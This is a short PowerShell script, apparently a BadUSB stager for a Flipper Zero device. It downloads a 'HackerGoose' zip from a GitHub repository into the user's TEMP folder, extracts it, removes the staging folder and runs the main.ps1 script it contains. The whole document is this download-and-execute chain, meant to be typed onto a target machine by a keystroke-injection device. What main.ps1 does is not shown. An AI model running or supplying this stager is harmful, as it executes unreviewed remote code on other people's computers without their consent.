# Set the URL for the raw content of the zip file on GitHub
$zipUrl = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/HackerGoose/HackerGoose.zip"

# Specify the temporary folder for extracting
$tempFolder = "$env:TEMP\HackerGooseTemp"

# Create the temporary folder if it doesn't exist
New-Item -ItemType Directory -Path $tempFolder -Force

# Specify the destination folder in temp
$Destination = "$env:TEMP"

# Force the use of TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download the zip file using Invoke-WebRequest
$zipPath = Join-Path $tempFolder "HackerGoose.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# Extract the contents of the "HackerGoose" folder to temp
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $Destination)

# Move the "hg" folder contents to temp
Move-Item -Path (Join-Path $Destination "HackerGoose\hg\*") -Destination $Destination -Force

# Clean up the temporary folder
Remove-Item -Path $tempFolder -Recurse -Force

& "$env:TEMP\hg\main.ps1"
